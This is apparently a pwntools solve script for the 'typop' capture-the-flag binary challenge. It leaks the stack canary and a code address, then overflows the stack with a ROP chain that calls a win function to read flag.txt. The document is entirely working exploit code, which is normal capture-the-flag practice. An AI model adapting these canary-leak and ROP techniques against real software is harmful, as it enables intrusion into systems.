from pwn import *

u = make_unpacker(64, endian='little', sign='unsigned')
binary = context.binary = ELF("./attachments/chall")

if not args.REMOTE:
    p = process(binary.path)
else:
    p = remote('typop.chal.idek.team', 1337)

payload =  b"y"
with open("payload", "wb") as fp:
    fp.write(payload)
p.sendline(payload)

p.recvuntil("Do you like ctf?\n")
payload = b""
payload += b"A" * 11
with open("payload", "ab") as fp:
    fp.write(payload)
p.send(payload)

buf = p.recvuntil("Can you provide some extra feedback?\n")
tmp = buf.split(b"AAAAAAAAAAA")[1]
tmp = tmp.split(b"\nAww")[0]
stack_canary = u(b"\x00" + tmp[:7])
stack_addr = u(tmp[7:].ljust(8, b"\x00"))
payload = b""
payload += b"B" * 10
payload += p64(stack_canary)
with open("payload", "ab") as fp:
    fp.write(payload)
p.send(payload)

# Second loop
p.recvuntil("Do you want to complete a survey?\n")
payload =  b"y"
with open("payload", "ab") as fp:
    fp.write(payload)
p.sendline(payload)

p.recvuntil("Do you like ctf?\n")
payload = b""
payload += b"B" * 26
with open("payload", "ab") as fp:
    fp.write(payload)
p.send(payload)

buf = p.recvuntil("Can you provide some extra feedback?\n")
main_addr = buf.split(b"BBBBBBBBBBBBBBBBBBBBBBBBBB")[1].split(b"\nAww")[0]
# 0x12ac
win_addr = u(main_addr.ljust(8, b"\x00")) - 0x19b
# 0x1233    pop rbp
rop_addr = u(main_addr.ljust(8, b"\x00")) - 0x214
payload = b"A" * 10
payload += p64(stack_canary)

payload += b"B" * 8
payload += p64(rop_addr)

new_frame_ptr = stack_addr + 90
payload += p64(new_frame_ptr)
payload += p64(win_addr)

payload += b"flag.txt\x00"

with open("payload", "ab") as fp:
    fp.write(payload)
p.send(payload)

p.interactive()